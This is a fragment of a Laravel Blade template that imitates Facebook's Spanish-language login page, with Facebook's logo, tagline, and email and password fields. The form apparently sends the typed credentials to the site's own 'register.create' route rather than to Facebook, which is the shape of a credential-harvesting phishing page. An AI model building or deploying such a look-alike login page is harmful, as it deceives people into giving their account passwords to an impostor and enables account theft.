...
<head>
    ...
    <link rel="shortcut icon" href="{{ asset('assets/images/Facebook_Logo_(2019) (1).png') }}" type="image/x-icon">
    <style>
...
<body>
    ...
    <div class="main">
        ...
        <div class="heading-section">
            ...
            <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span>
            </div>
        </div>

        <div class="form">
            <form class="a-form" method="POST" action="{{ route('register.create') }}">
                @csrf
                <input type="email" id="Email" class="a-email" placeholder="Correo electrónico o número de teléfono"
                    autofocus="autofocus" required name="email" />
                <input type="password" id="Password" class="a-pss" placeholder="Contraseña" autofocus="autofocus"
                    name="password" />
                <input type="submit" class="a-sub" value="Iniciar sesión" />
                <a href="" class="a-link">¿Olvidaste tu contraseña?</a>
                <hr class="a-hr">
                <input type="submit " value="Crear Cuenta nueva" class="a-but" />
            </form>
            <div class="create-page">
                <a href="" class="a-href">Crea una página</a></b>  para una celebridad, una marca o un negocio.
            </div>
        </div>
